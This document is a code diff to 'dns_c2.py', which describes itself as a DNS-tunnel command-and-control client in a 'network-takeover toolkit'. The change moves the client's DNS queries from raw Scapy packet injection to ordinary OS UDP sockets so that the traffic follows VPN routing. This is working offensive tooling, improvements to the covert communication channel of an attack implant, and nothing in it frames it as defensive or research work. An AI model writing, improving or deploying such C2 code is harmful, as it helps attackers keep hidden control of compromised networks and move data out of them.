@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v1.0
+# v1.1
 """
 dns_c2.py — DNS tunnel C2 client for the network-takeover toolkit.
 
@@ -30,7 +30,7 @@ import subprocess
 import threading
 import time
 
-from scapy.all import IP, UDP, send, sr1, conf
+from scapy.all import conf
 from scapy.layers.dns import DNS, DNSQR
 
 conf.verb = 0
@@ -99,31 +99,35 @@ def gen_agent_id() -> str:
 
 # ── Raw DNS helpers ────────────────────────────────────────────────────────────
 
+def _dns_send(qname: str, qtype: str, dns_server: str, wait_reply: bool):
+    """
+    Build a DNS query with Scapy and send it via an OS UDP socket so the
+    packet travels through the normal network stack — VPN routing applies,
+    Npcap raw injection is bypassed.
+    """
+    pkt = DNS(id=random.randint(0, 65535), rd=1, qd=DNSQR(qname=qname, qtype=qtype))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(5)
+    try:
+        sock.sendto(bytes(pkt), (dns_server, 53))
+        if not wait_reply:
+            return None
+        data, _ = sock.recvfrom(4096)
+        return DNS(data)
+    except OSError:
+        return None
+    finally:
+        sock.close()
+
+
 def _query_a(qname: str, dns_server: str) -> None:
     """Fire-and-forget DNS A query (no response expected)."""
-    pkt = (
-        IP(dst=dns_server)
-        / UDP(sport=random.randint(1024, 65534), dport=53)
-        / DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
-    )
-    send(pkt, verbose=0)
+    _dns_send(qname, "A", dns_server, wait_reply=False)
 
 
 def _query_txt(qname: str, dns_server: str):
-    """Send a DNS TXT query and return the response packet (or None on timeout)."""
-    try:
-        iface, _, _ = conf.route.route(dns_server)
-    except Exception:
-        iface = None
-    pkt = (
-        IP(dst=dns_server)
-        / UDP(sport=random.randint(1024, 65534), dport=53)
-        / DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
-    )
-    kwargs = {"timeout": 5, "verbose": 0}
-    if iface:
-        kwargs["iface"] = iface
-    return sr1(pkt, **kwargs)
+    """Send a DNS TXT query and return the parsed DNS response, or None."""
+    return _dns_send(qname, "TXT", dns_server, wait_reply=True)
 
 
 def _extract_txt(resp) -> str | None:
